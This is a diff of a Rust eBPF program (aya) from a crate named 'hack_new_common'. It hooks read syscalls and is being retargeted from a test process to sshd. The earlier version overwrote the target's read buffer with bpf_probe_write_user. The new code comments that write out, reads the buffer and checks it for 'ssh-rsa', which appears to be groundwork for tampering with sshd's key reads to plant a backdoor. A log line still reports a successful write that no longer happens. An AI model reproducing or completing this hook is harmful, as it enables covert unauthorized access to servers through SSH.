@@ -1,24 +1,34 @@
 #![no_std]
 #![no_main]
 #![feature(c_str_module)]
-use core::ffi::c_str;
 
 use aya_ebpf::{
-    cty::c_void,
-    helpers::{bpf_get_current_pid_tgid, gen::bpf_probe_write_user},
+    helpers::{
+        bpf_get_current_pid_tgid,
+        gen::{bpf_probe_read, bpf_probe_write_user},
+    },
     macros::{map, tracepoint},
-    maps::HashMap,
+    maps::{Array, HashMap},
     programs::TracePointContext,
     EbpfContext,
 };
 use aya_log_ebpf::info;
-use hack_new_common::SyscallReadLogging;
+use core::ffi::c_str;
+use core::ffi::c_void;
+use core::mem;
+use hack_new_common::{StringInfo, SyscallReadLogging};
 
+#[allow(non_upper_case_globals)]
 #[map]
-static MAP_BUFF_ADDRS: HashMap<u64, SyscallReadLogging> =
+static map_buff_addrs: HashMap<u64, SyscallReadLogging> =
     HashMap::<u64, SyscallReadLogging>::with_max_entries(1024, 0);
 
-const TARGET_COMM: &[u8] = b"behooked";
+#[allow(non_upper_case_globals)]
+#[map]
+static string_array: Array<StringInfo> = Array::with_max_entries(10, 0);
+
+#[allow(non_upper_case_globals)]
+const target_comm: &[u8] = b"sshd";
 
 #[tracepoint]
 pub fn tracepoint_sys_enter_read(ctx: TracePointContext) -> u32 {
@@ -30,13 +40,13 @@ pub fn tracepoint_sys_enter_read(ctx: TracePointContext) -> u32 {
 
 fn sys_enter_read_check(ctx: TracePointContext) -> Result<u32, u32> {
     if let Ok(comm) = ctx.command() {
-        for (index, target_char) in TARGET_COMM.iter().enumerate() {
+        for (index, target_char) in target_comm.iter().enumerate() {
             if *target_char != comm[index] {
                 return Ok(0);
             }
         }
     } else {
-        info!(&ctx, "悲");
+        info!(&ctx, "ctx.command() in sys_enter_read_check failed");
         return Err(0);
     };
 
@@ -56,7 +66,7 @@ fn sys_enter_read_check(ctx: TracePointContext) -> Result<u32, u32> {
         data.calling_size = size;
     }
 
-    MAP_BUFF_ADDRS.insert(&pid_tgid, &data, 0).unwrap();
+    map_buff_addrs.insert(&pid_tgid, &data, 0).unwrap();
 
     Ok(0)
 }
@@ -71,31 +81,39 @@ pub fn tracepoint_sys_exit_read(ctx: TracePointContext) -> u32 {
 
 fn sys_exit_read_check(ctx: TracePointContext) -> Result<u32, u32> {
     if let Ok(comm) = ctx.command() {
-        for (index, target_char) in TARGET_COMM.iter().enumerate() {
+        for (index, target_char) in target_comm.iter().enumerate() {
             if *target_char != comm[index] {
                 return Ok(0);
             }
         }
     } else {
-        info!(&ctx, "悲");
+        info!(&ctx, "ctx.command() in sys_exit_read_check failed");
         return Err(0);
     };
     let pid_tgid = bpf_get_current_pid_tgid();
 
     unsafe {
-        if let Some(data) = MAP_BUFF_ADDRS.get(&pid_tgid) {
-            let hook = c_str::CStr::from_bytes_with_nul(b"flat{true}\0").unwrap();
+        if let Some(data) = map_buff_addrs.get(&pid_tgid) {
+            let becheck = c_str::CStr::from_bytes_with_nul(b"ssh-rsa\0").unwrap();
             let te = data.calling_size;
             let tmpbuf = data.buffer_addr;
+
+            let mut str: [u8; 7] = [0; 7];
+
+            bpf_probe_read(
+                str.as_mut_ptr() as *mut c_void,
+                mem::size_of_val(&str) as u32,
+                tmpbuf as *const c_void,
+            );
 
             if te != 4096 {
                 return Ok(0);
             }
-            bpf_probe_write_user(
-                tmpbuf as *mut c_void,
-                hook.as_ptr() as *const c_void,
-                hook.to_bytes_with_nul().len() as u32,
-            );
+            // bpf_probe_write_user(
+            //     tmpbuf as *mut c_void,
+            //     hook.as_ptr() as *const c_void,
+            //     hook.to_bytes_with_nul().len() as u32,
+            // );
             info!(&ctx, "已经成功写入，地址是0x{:x}", { tmpbuf });
         } else {
             return Ok(0);
